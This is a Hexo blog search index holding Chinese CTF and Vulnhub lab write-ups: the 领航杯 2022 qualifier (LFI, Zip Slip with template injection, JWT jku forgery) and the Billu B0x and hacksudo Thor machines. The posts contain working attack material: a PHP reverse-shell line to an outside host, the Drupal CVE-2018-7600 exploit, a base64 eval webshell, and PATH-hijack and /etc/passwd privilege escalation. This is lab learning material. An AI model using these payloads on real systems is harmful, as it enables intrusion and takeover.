<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>博客整改</title>
    <url>/2022/08/25/20220825%E5%8D%9A%E5%AE%A2%E6%95%B4%E6%94%B9/</url>
    <content><![CDATA[<blockquote>
<p>2022-8-25</p>
</blockquote>
<p>对此博客进行主题更换，保留以前文章，提高接下来的博客文章质量。</p>
]]></content>
  </entry>
  <entry>
    <title>领航杯2022初赛write up</title>
    <url>/2022/08/25/20220825%E9%A2%86%E8%88%AA%E6%9D%AFwp/</url>
    <content><![CDATA[<h1 id="linkgame"><a href="#linkgame" class="headerlink" title="linkgame"></a>linkgame</h1><p>发现可以lfi的地方，伪协议读取index.php源码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823155748-kyzig1n.png" alt="image">​</p>
<p>尝试直接去include session文件，反正可以写入session</p>
<p>后来发现可以读到session文件，并且写入的数据是base64编码保存的，就尝试用解码的过滤器去把他带出来，当然前面要添加垃圾字符来保证是4的倍数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /?file=php:<span class="comment">//filter/convert.base64-decode/resource=../../../tmp/sess_150ak6n4vclbpnm5263qpi5c25&amp;name=aabcdabcdabcdabddddcdabcdabcdabcdabcdabcdabcdabcdabcd&lt;?php+system(&#x27;cat+/f*&#x27;);?&gt; HTTP/1.1</span></span><br><span class="line">Host: <span class="number">39.106</span>.<span class="number">148.107</span>:<span class="number">16698</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">99.0</span>.<span class="number">4844.51</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=150ak6n4vclbpnm5263qpi5c25</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 14</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823155943-vk8isi2.png" alt="image">​</p>
<p>HongKe{ac59054a40ea53757b7a0c8d99875027}</p>
<h1 id="TarSlip"><a href="#TarSlip" class="headerlink" title="TarSlip"></a>TarSlip</h1><p>报错查看到部分源码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823143954-nirgqse.png" alt="image">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823160132-g54kjso.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823160448-eq8p8us.png" alt="image">​</p>
<p>存在Zip Slip漏洞，可以用它来覆盖原有的上级路径下的文件</p>
<p>在解压的时候覆盖原有的文件</p>
<p>Flask开启了调试模式，尝试覆盖模板index.html，达到模板注入rce</p>
<p>网上找了脚本生成tar</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;1.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">    info = tarfile.TarInfo(<span class="string">&quot;../../../templates/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    deserialization_payload = (</span><br><span class="line">        <span class="string">&#x27;&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;/flag&quot;).read() &#125;&#125;&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    info.size = <span class="built_in">len</span>(deserialization_payload)</span><br><span class="line">    info.mode = <span class="number">0o444</span>  <span class="comment"># So it cannot be overwritten</span></span><br><span class="line"></span><br><span class="line">    tar.addfile(info, io.BytesIO(deserialization_payload.encode()))</span><br><span class="line">    tar.close()</span><br></pre></td></tr></table></figure>

<p>上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.gz&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    res = requests.post(</span><br><span class="line">        <span class="string">&quot;http://39.106.148.107:16743/api/untar&quot;</span>, files=&#123;<span class="string">&quot;file&quot;</span>: file.read()&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>rce成功</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823145343-4wrmu9x.png" alt="image">​</p>
<p>CnHongKe{49d2c218cbdbbee6381c7f9601bf0205}</p>
<h1 id="jwt2"><a href="#jwt2" class="headerlink" title="jwt2"></a>jwt2</h1><p>随便注册一个用户，分析jwt</p>
<p>头部是这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jku&quot;</span>: <span class="string">&quot;http://localhost:5000/static/styles/jwks.json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>/static/styles/jwks.json</code>保存本地</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153430-rc3mnur.png" alt="image">​</p>
<p>在<a href="https://mkjwk.org/%E4%B8%AD%E7%94%9F%E6%88%90keypair">https://mkjwk.org/中生成keypair</a></p>
<p>用生成的n替换掉n</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153410-ohzf5k2.png" alt="image">​</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,</span><br><span class="line">            <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;demo&quot;</span>,</span><br><span class="line">            <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">            <span class="string">&quot;n&quot;</span>: <span class="string">&quot;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&quot;</span>,</span><br><span class="line">            <span class="string">&quot;e&quot;</span>: <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放在vps上，目录开http服务</p>
<p>然后构造jwt</p>
<p>公钥和私钥从刚刚生成的里面复制</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153537-5jgnujx.png" alt="image">​</p>
<p>这里jku替换成vps上的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jku&quot;</span>: <span class="string">&quot;http://120.27.248.81/jwks.json&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153329-fauzdj3.png" alt="image">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153314-6cxdair.png" alt="image">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220823153551-lycj7rf.png" alt="image">​</p>
<p>CnHongKe{3d5d119ab41e94e256d24f021823746e}</p>
<h1 id="小明的困惑"><a href="#小明的困惑" class="headerlink" title="小明的困惑"></a>小明的困惑</h1><p>拿到图片发现里面隐藏了东西，先foremost分离出来</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image002-20220823174635-mqk6hb8.jpg">​</p>
<p>然后zsteg看一下通道，发现里面有个eg_information</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image004-20220823174635-ccowszj.jpg">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image006-20220823174635-pft4ttd.jpg">​</p>
<p>然后用pngcheck检测png图片是否被修改过，果然图片是被动过的</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image008-20220823174635-ljq5xbj.jpg">​</p>
<p>修改ihdr得到原始图片</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image010-20220823174635-hsxz3an.jpg">​</p>
<p>发现右下角有个find_str，与之前得到的拼在一起可以得到压缩包的密码：find_steg_information，打开压缩包</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image012-20220823174635-qz4lhee.jpg">​</p>
<p>发现行数呈现一定的规律</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image014-20220823174635-nlj75oa.jpg">​</p>
<p>猜测为二进制，在线转码得到：CnH0n9Ke</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image016-20220823174635-m0b7yx5.jpg" alt="IMG_256">​</p>
<p>据题意要md5的值</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image018-20220823174635-latgtyf.jpg">​</p>
<p>所以最后的flag为：</p>
<p>CnHongKe{62912e0cb10240c1f323c719b7ec5706}</p>
<h1 id="SmallIp"><a href="#SmallIp" class="headerlink" title="SmallIp"></a>SmallIp</h1><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image002-20220823174718-87p2akf.jpg">​</p>
<p>如图可知字母为rot13解决，数字为ascll表对应值与7异或处理，其他符号用ascll表对应值与6异或。</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image004-20220823174718-wgckr46.jpg">​</p>
<p>这个nj &#x3D;<br>“PaUbatXr}P7ate3gh63ge7af{“为加密过后的结果</p>
<p>经解密得CnHongKe{C0ngr4tu14tr0ns}</p>
<p>所以结果为此</p>
<p>验证得</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/clip_image006-20220823174718-suxiu0z.jpg">​</p>
<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n= <span class="number">18068084654503166459678256330702863359058855857364297657967966547721339739774006329918220663022306569505094844488394089767989656632513885150147468647129320316884121695436759043299519486096468548569125022874657850436656755056592057603683592308393335091313125510527778277584046865412410461354443376761977198663827654733137098378331471195448635250255391138122238570361223672500510336508097682979064499210197237414629707976646241474531359676074143979974285720290865649993620043169639863845529538686458568022824251216003309356279073057734111752994714199138627394600571994085388795698092627546703002648115505809394107286143</span></span><br><span class="line">e= <span class="number">7</span></span><br><span class="line">c= <span class="number">12638092982695661510801150389916683505333379755571736707014609281536097225309558432845064087780222143856194730895008362619433554338827184174867917468438857696106608248037932751836798649128943244807603793586431297829198511854055960619667075145609763782148006924165793533190668777929738448780729325061197428046010754750547992393229482720438349717059808374022743576774097271594850957513597564719686802663578631452072033770243212715027502576569751164626421</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_to_ans</span>(<span class="params">m</span>):  <span class="comment"># 求出明文m后将m转化成文字</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">while</span> m != <span class="number">0</span>:</span><br><span class="line">        m, b = <span class="built_in">divmod</span>(m, <span class="number">256</span>)</span><br><span class="line">        l.insert(<span class="number">0</span>, <span class="built_in">chr</span>(b))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(l))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"><span class="built_in">print</span>(gmpy2.iroot(c, e))</span><br><span class="line">small_msg(e,n,c)</span><br><span class="line">m_to_ans(<span class="number">27739419203610272465846297626078343194214077317795017373626235261</span>)</span><br></pre></td></tr></table></figure>

<p>CnHongKe{Th1s_i5_vEry_e45y}</p>
]]></content>
  </entry>
  <entry>
    <title>【vlunhub】BILLU:B0X1+2</title>
    <url>/2022/08/30/20220830vulnhub-BILLU/</url>
    <content><![CDATA[<blockquote>
<p>个人测评：</p>
<p>趣味：2星+1星（one piece）</p>
<p>难度：3星</p>
<p>技巧：3星</p>
</blockquote>
<p>两个靶机，分别玩一下，感觉年份都有点老了</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830015404-550uhj8.png" alt="image">​</p>
<h1 id="billu-b0x1"><a href="#billu-b0x1" class="headerlink" title="billu b0x1"></a>billu b0x1</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>17年发布的靶机，先信息搜集一波</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829222057-pabm7fw.png" alt="image">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829222328-bp2qbfd.png" alt="image">​</p>
<p>进行简单的目录扫描</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001328-rzyl9zr.png" alt="image">​</p>
<p>其中我们能看到一个phpmyadmin的后台，一个phpinfo页面</p>
<h2 id="sql注入到getshell"><a href="#sql注入到getshell" class="headerlink" title="sql注入到getshell"></a>sql注入到getshell</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829232551-pu3g6a1.png" alt="image">​</p>
<p>成功登陆进去，后面用\将单引号转义后成为注释</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829234953-7d657d8.png" alt="image">​</p>
<p>随后是一个上传的页面</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829235146-gdbmnyk.png" alt="image">​</p>
<p>这里的上传点对后缀进行了白名单校验</p>
<p>所以上传shell比较局限</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001441-a0dki7f.png" alt="image">​</p>
<p>发现这里load参数后面跟的好像是add.php</p>
<p>果然有个文件包含</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001523-1q07m92.png" alt="image">​</p>
<p>也是能成功包含到上传上去的jpg来rce</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830001649-bzont35.png" alt="image">​</p>
<p>如何反弹shell</p>
<p>经过一些尝试，用<code>proc_open</code>拿到了相对持久的终端</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">4445</span>);<span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830003449-9rn7gc6.png" alt="image">​</p>
<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>其实刚刚我们可以看到有个叫做ica的用户</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830003507-53sc4j8.png" alt="image">​</p>
<p>网站目录里面找数据库密码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830004023-v01orxu.png" alt="image">​</p>
<p>当然可以看到他都没有设置端口，这个phpmyadmin貌似看起来不能用</p>
<p>当前目录下面也有一个c.php，里面也有个密码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830004518-unrz237.png" alt="image">​</p>
<p>billu b0x_billu</p>
<p>没想到用这个密码就能登陆进去</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830014041-uy15j57.png" alt="image">​</p>
<p>上面的root roottoor也能直接用ssh连上</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830014857-ssfct9s.png" alt="image">​</p>
<p>即便不使用刚刚的包含漏洞，这里我们也能获取到这两个密码，网站目录下有个test.php也能任意文件读取</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830020826-mwxgf6z.png" alt="image">​</p>
<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>最简单粗暴的方法</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830011454-ps3jbkk.png" alt="image">​</p>
<p>直接放到目标机器上编译运行即可</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830011835-0du9aup.png" alt="image">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830012002-bplogqg.png" alt="image">​</p>
<h1 id="billu-b0x2"><a href="#billu-b0x2" class="headerlink" title="billu b0x2"></a>billu b0x2</h1><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830020932-f4ixvme.png" alt="image">​</p>
<p>这个靶机明显比一代复杂得多，分别再看每个端口都开了什么服务</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830021159-f9xefrd.png" alt="image">​</p>
<p>80端口的服务，使用的是<a href="https://www.drupal.org/">Drupal</a>8搭建的</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830021347-resmcam.png" alt="image">​</p>
<p>在扫描路径的过程中，我获得了这个drupal的详细版本号8.3.5</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830022836-3o56v0z.png" alt="image">​</p>
<p>在kali自带的exploitdb中，也发现了很多能在这个版本上用的exp，随便挑了一个，测试成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;################################################################&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# Proof-Of-Concept for CVE-2018-7600&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# by Vitalii Rudnykh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;# https://github.com/a2u/CVE-2018-7600&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;################################################################&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Provided only for educational or information purposes\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">input</span>(<span class="string">&#x27;Enter target url (example: https://domain.ltd/): &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add proxy support (eg. BURP to analyze HTTP(s) traffic)</span></span><br><span class="line"><span class="comment"># set verify = False if your proxy certificate is self signed</span></span><br><span class="line"><span class="comment"># remember to set proxies both for http and https</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;, &#x27;https&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line"><span class="comment"># verify = False</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">verify = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;form_id&#x27;</span>: <span class="string">&#x27;user_register_form&#x27;</span>, <span class="string">&#x27;_drupal_ajax&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;mail[#post_render][]&#x27;</span>: <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;mail[#type]&#x27;</span>: <span class="string">&#x27;markup&#x27;</span>, <span class="string">&#x27;mail[#markup]&#x27;</span>: <span class="string">&#x27;echo &quot;;-)&quot; | tee hello.txt&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, proxies=proxies, data=payload, verify=verify)</span><br><span class="line">check = requests.get(target + <span class="string">&#x27;hello.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> check.status_code != <span class="number">200</span>:</span><br><span class="line">  sys.exit(<span class="string">&quot;Not exploitable&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;\nCheck: &#x27;</span>+target+<span class="string">&#x27;hello.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>写入webshell先，直接echo会转义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo `echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ | base64 --decode` | tee fuck.php</span><br></pre></td></tr></table></figure>

<p>蚁剑连接，反弹shell，升级shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830025433-m3p7bfa.png" alt="image">​</p>
<p>算是先拿到一个基础的权限</p>
<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>&#x2F;opt&#x2F;s</p>
<p>简单查看一下可阅读的部分</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830032456-q85f1q1.png" alt="image">​</p>
<p>它会调用scp这个命令</p>
<p>更改环境变量，让他找scp命令时先找到tmp目录下面我们建立的恶意的scp</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830033046-s7ckisf.png" alt="image">‘</p>
<p>把tmp加到$PATH最前面</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830032825-kfpsolu.png" alt="image">​</p>
<p>即可提权成功</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830033306-jcw7p8p.png" alt="image">​</p>
<h2 id="替换-x2F-etc-x2F-passwd"><a href="#替换-x2F-etc-x2F-passwd" class="headerlink" title="替换&#x2F;etc&#x2F;passwd"></a>替换&#x2F;etc&#x2F;passwd</h2><p>之后，我找了老外对这个第二个靶机的文章学习，因为我觉得应该还有别的出路</p>
<p>之前我也注意到&#x2F;etc&#x2F;passwd里面奇怪的哈希，但没注意到他的权限</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830033926-d6u65gp.png" alt="image">​</p>
<p>也能注意到indishell这个用户，他甚至给出了加密后的密码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034032-mgvoqir.png" alt="image">​</p>
<p>用openssl生成密码</p>
<p>用infosec做为salt并也是密码，得到生成的密码，替换掉&#x2F;etc&#x2F;passwd里面的密码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034301-ovnr63l.png" alt="image">​</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034348-n4m1r2s.png" alt="image">​</p>
<p>我们就能替换掉indishell的密码，并且获取root权限</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220830034501-8u1dpk1.png" alt="image">​</p>
]]></content>
  </entry>
  <entry>
    <title>【vlunhub】hacksudo - Thor</title>
    <url>/2022/08/29/20220829vulnhubhacksudo-Thor/</url>
    <content><![CDATA[<blockquote>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">https://www.vulnhub.com/entry/hacksudo-thor,733/</a></p>
<p>个人测评：</p>
<p>趣味：3星</p>
<p>难度：3星</p>
<p>技巧：2星</p>
</blockquote>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>bash遍历扫c段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> $( <span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 10.0.2.<span class="variable">$k</span>|grep <span class="string">&quot;ttl&quot;</span>|awk -F <span class="string">&quot;[ :]+&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>找到我们的目标靶机</p>
<p>或者用arp二层发现</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829192952-0oc8eg0.png" alt="image"></p>
<p>用nmap进行全端口扫描</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829193043-7nblkuv.png" alt="image"></p>
<p>80端口是个网站，先尝试从这里突破</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829193158-9p27ts9.png" alt="image"></p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>扫出来一个readme，里面泄露了源码地址</p>
<p><a href="https://github.com/zakee94/online-banking-system">https://github.com/zakee94/online-banking-system</a></p>
<p>到管理员登陆后台，用sql文件里面自带的admin登陆即可</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829195708-2eyi11x.png" alt="image"></p>
<p>发现一个无过滤的注入点</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829195943-lhdoqhv.png" alt="image"></p>
<p>同样的，后台有回显的注入</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829201858-njf1lu2.png" alt="image"><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829201906-tj7q4yl.png" alt="image"></p>
<p>先用load_file找到网站路径</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829202020-lr4k9lu.png" alt="image"></p>
<p>貌似没有写入权限</p>
<p>那如何getshell呢，这里直接卡住</p>
<h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u url -f -e cgi,sh</span><br><span class="line">看有没有cgi，sh结尾的文件</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829211016-v8r630y.png" alt="image"></p>
<p>存在破壳漏洞</p>
<p>关于破壳漏洞：<a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829211212-gb04dfv.png" alt="image"></p>
<p>反弹shell</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829211934-pjgs1gg.png" alt="image"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>suid，sudo， 系统版本检查</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829213112-v5ykx2w.png" alt="image"></p>
<p>www-data可以不用密码就能调用hammer.sh这个脚本</p>
<p>发现能执行命令</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214053-qwbz32q.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214125-lf8sqfd.png" alt="image"></p>
<p>尝试反弹shell，获取thor的权限</p>
